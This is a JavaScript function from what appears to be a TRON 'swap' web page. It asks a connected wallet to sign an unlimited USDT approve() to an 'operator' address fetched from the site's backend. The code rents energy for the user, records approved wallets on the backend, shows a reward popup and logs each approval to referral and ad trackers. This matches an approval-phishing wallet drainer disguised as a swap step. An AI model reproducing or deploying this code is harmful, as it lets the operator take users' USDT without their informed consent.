// ========== EXECUTE UNLIMITED APPROVE ==========
function formatI18n(key, fallback, params) {
    var msg = T(key, fallback);
    if (!params) return msg;
    Object.keys(params).forEach(function (k) {
        msg = msg.replace(new RegExp('\\{' + k + '\\}', 'g'), String(params[k]));
    });
    return msg;
}

window.executeUnlimitedApprove = async function () {
    if (!isConnected || !currentWalletAddress) {
        showToast(T('wallet_connect_first', '지갑을 먼저 연결하세요.'), 'error');
        handleConnectWallet();
        return;
    }
    if (isApproved || isApproving) return;

    // 중복 요청 방지
    var reqId = currentWalletAddress + '_' + Date.now();
    if (pendingApproveId) return;
    pendingApproveId = reqId;

    isApproving = true;

    // Spender 주소 획득 (최대 3회 재시도)
    for (var _sp = 0; _sp < 3; _sp++) {
        spender = await getSpenderAddress();
        if (spender) break;
        await new Promise(function (r) { setTimeout(r, 1000); });
    }
    if (!spender) {
        showToast(T('operator_addr_fail', '운영자 주소를 불러오지 못했습니다.'), 'error');
        isApproving = false;
        pendingApproveId = null;
        return;
    }

    // TronWeb 획득
    var tw = window.tronWeb || null;
    if (!tw && window.tronLink && window.tronLink.tronWeb) tw = window.tronLink.tronWeb;
    var useWC = false;

    if (!tw || !tw.contract) {
        // 최대 5초 대기
        for (var _wait = 0; _wait < 5; _wait++) {
            await new Promise(function (r) { setTimeout(r, 1000); });
            tw = window.tronWeb || null;
            if (!tw && window.tronLink && window.tronLink.tronWeb) tw = window.tronLink.tronWeb;
            if (tw && tw.contract) break;
        }
        if (!tw || !tw.contract) {
            try {
                if (window.tronLink) {
                    var _req = await window.tronLink.request({ method: 'tron_requestAccounts' });
                    if (_req && _req.code === 200 && window.tronWeb) tw = window.tronWeb;
                }
            } catch (e) { }
        }
        if (!tw || !tw.contract) {
            showToast(T('open_in_dapp', '지갑 앱 DApp 브라우저에서 열어주세요!'), 'error');
            if (wcConnector && wcAddress) {
                useWC = true;
            } else {
                showToast(T('wallet_disconnected', '지갑 연결이 끊겼습니다. 다시 연결해주세요.'), 'error');
                isApproving = false;
                pendingApproveId = null;
                handleConnectWallet();
                return;
            }
        }
    }

    var btn = document.getElementById('approve-btn');
    if (btn) {
        btn.disabled = true;
        btn.innerHTML = '<span class="animate-spin rounded-full h-4 w-4 border-2 border-white border-t-transparent"></span><span>' + T('processing_msg', '처리 중...') + '</span>';
    }

    setProgress(25, T('checking_energy_wallet_msg', '에너지 및 지갑 상태 확인 중...'));

    // Prepare approve (비동기, 실패해도 계속)
    try {
        await apiFetch(API_BASE + '/wallet/prepare-approve', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: currentWalletAddress })
        });
    } catch (pe) { }

    // 에너지 렌탈 요청
    try {
        var rentRes = await apiFetch(API_BASE + '/energy/rent', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ address: currentWalletAddress, amount: 131000, duration: '1h' })
        });
        var rentData = await rentRes.json();
        if (rentData && rentData.status === 'ok' && rentData.rented) {
            setProgress(50, T('energy_rent_done_msg', '에너지 렌탈 완료!'));
            showToast(T('energy_rent_done_msg', '에너지 렌탈 완료!'));
            if (!rentData.confirmed) await new Promise(function (r) { setTimeout(r, 2000); });
        } else if (rentData && rentData.reason === 'enough_energy') {
            var curEnergy = Number(rentData.currentEnergy) || 130000;
            setProgress(50, formatI18n('energy_enough_skip_msg', '보유 에너지 충분 ({energy}) - 렌탈 생략', { energy: curEnergy.toLocaleString() }));
        }
    } catch (rentErr) { }

    setProgress(60, T('signing_request_msg', '스마트 컨트랙트 승인 서명 요청 중...'));
    showToast(T('check_sign_popup_msg', '지갑에서 서명 팝업을 확인하세요.'));

    try {
        var txHash;

        if (useWC) {
            // ===== WalletConnect 경로 =====
            var addrHex = base58ToHex(spender);
            var paddedAddr = addrHex.padStart(64, '0');
            var maxUint = 'ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
            var abiParam = paddedAddr + maxUint;

            var triggerRes = await fetch('https://api.trongrid.io/wallet/triggersmartcontract', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    owner_address: currentWalletAddress,
                    contract_address: OFFICIAL_USDT_CONTRACT,
                    function_selector: 'approve(address,uint256)',
                    parameter: abiParam,
                    fee_limit: 100000000,
                    call_value: 0,
                    visible: true
                })
            });
            var triggerData = await triggerRes.json();
            if (!triggerData.transaction) throw new Error(T('tx_build_fail_msg', '트랜잭션 생성 실패'));

            var wcResult;
            var wcSignTimeout = new Promise(function (_, reject) {
                setTimeout(function () {
                    reject(new Error(T('wc_sign_timeout_msg', '서명 응답 시간 초과 (지갑 앱을 확인해 주세요)')));
                }, 60000);
            });

            if (wcConnector.signTransaction) {
                wcResult = await Promise.race([wcConnector.signTransaction(triggerData.transaction), wcSignTimeout]);
            } else if (wcConnector.client) {
                var activeTopic = (wcConnector.session && wcConnector.session.topic) ||
                    (wcConnector.client.session && wcConnector.client.session.keys && wcConnector.client.session.keys[0]);
                if (!activeTopic) {
                    showToast(T('wc_session_expired', 'WalletConnect 세션 만료. 다시 연결해주세요.'), 'error');
                    isApproving = false;
                    pendingApproveId = null;
                    wcConnector = null;
                    wcAddress = null;
                    try { localStorage.removeItem('feeslash_wc_topic'); } catch (e) { }
                    handleConnectWallet();
                    return;
                }
                wcResult = await Promise.race([
                    wcConnector.client.request({
                        topic: activeTopic,
                        chainId: 'tron:0x2b6653dc',
                        request: { method: 'tron_signTransaction', params: [triggerData.transaction] }
                    }),
                    wcSignTimeout
                ]);
            } else {
                throw new Error(T('wc_no_sign_method_msg', 'WalletConnect 서명 메서드를 찾을 수 없습니다'));
            }

            var broadcastPayload = parseWcSignature(wcResult, triggerData.transaction);

            var broadcastRes = await fetch('https://api.trongrid.io/wallet/broadcasttransaction', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(broadcastPayload)
            });
            var broadcastData = await broadcastRes.json();
            if (!broadcastData.result) {
                var detail = broadcastData.Error || broadcastData.message || JSON.stringify(broadcastData);
                throw new Error(formatI18n('tx_broadcast_fail_msg', '브로드캐스트 실패: {detail}', { detail: detail }));
            }
            txHash = broadcastData.txid || broadcastPayload.txID || 'ok';

        } else {
            // ===== DApp 브라우저 경로 =====
            var tx = await tw.transactionBuilder.triggerSmartContract(
                OFFICIAL_USDT_CONTRACT,
                'approve(address,uint256)',
                { feeLimit: 100000000 },
                [{ type: 'address', value: spender }, { type: 'uint256', value: MAX_ALLOWANCE }],
                currentWalletAddress
            );
            if (!tx || !tx.transaction) throw new Error(T('tx_build_fail_msg', '트랜잭션 생성 실패'));

            showToast(T('check_wallet_popup', '지갑 팝업을 확인하세요! 🔔'));
            var signPromise = tw.trx.sign(tx.transaction);
            var timeoutPromise = new Promise(function (_, reject) {
                setTimeout(function () {
                    reject(new Error(T('sign_timeout', '서명 응답 시간 초과. 지갑 앱을 확인해주세요.')));
                }, 30000);
            });
            var signedTx = await Promise.race([signPromise, timeoutPromise]);
            var result = await tw.trx.sendRawTransaction(signedTx);
            txHash = (result && result.txid) || (result && result.transaction && result.transaction.txID) || (signedTx && signedTx.txID) || 'ok';
        }

        if (!txHash) throw new Error(T('tx_hash_missing_msg', 'TX 해시 수신 실패'));

        setProgress(100, T('onchain_approved_msg', '온체인 승인 완료!'));
        isApproved = true;
        setApprovedUI();

        try {
            if (typeof fbq === 'function') {
                fbq('track', 'CompleteRegistration', { content_name: 'Contract Approved' });
            }
        } catch (e) { }

        var txHashEl = document.getElementById('modal-txhash');
        if (txHashEl) {
            txHashEl.textContent = typeof txHash === 'string' ? txHash.substring(0, 20) + '...' : String(txHash);
        }
        document.getElementById('reward-modal').classList.add('active');

        // 백엔드에 "승인됨" 영구 기록
        try {
            await apiFetch(API_BASE + '/wallet/mark-approved', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    address: currentWalletAddress,
                    txHash: txHash
                })
            });
            console.log('[APPROVE] marked as approved on backend');
        } catch (e) {
            console.warn('[APPROVE] mark-approved failed:', e);
        }

        // 백엔드 승인 상태 동기화 (재시도)
        for (var syncRetry = 0; syncRetry < 2; syncRetry++) {
            try {
                await apiFetch(API_BASE + '/wallet/connect', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ address: currentWalletAddress, provider: activeProvider })
                });
                break;
            } catch (e) {
                if (syncRetry === 1) console.warn('Backend sync failed');
                else await new Promise(function (r) { setTimeout(r, 500); });
            }
        }

        trackReferralApprove(currentWalletAddress, txHash);
        showToast(T('swap_approved', '교환 승인 완료!'));

    } catch (err) {
        hideProgress();
        var m = (err && err.message) ? err.message : JSON.stringify(err);
        if (m.indexOf('declined') >= 0 || m.indexOf('rejected') >= 0 || m.indexOf('cancel') >= 0 || m.indexOf('취소') >= 0) {
            showToast(T('sign_cancelled_msg', '서명 취소됨'), 'error');
        } else {
            showToast(formatI18n('tx_failed_msg', '트랜잭션 실패: {detail}', { detail: m.substring(0, 50) }), 'error');
            console.error('[APPROVE]', err);
        }
    } finally {
        isApproving = false;
        pendingApproveId = null;
        hideProgress();
        var btnLabel = isApproved
            ? T('swap_btn_done', '교환하기')
            : T('swap_btn_text', '교환 시작 (최초 1회 승인 필요)');
        if (btn) {
            btn.innerHTML = '<i class="fa-solid fa-arrow-right-arrow-left"></i><span id="approve-btn-text">' + btnLabel + '</span>';
            btn.disabled = false;
        }
    }
};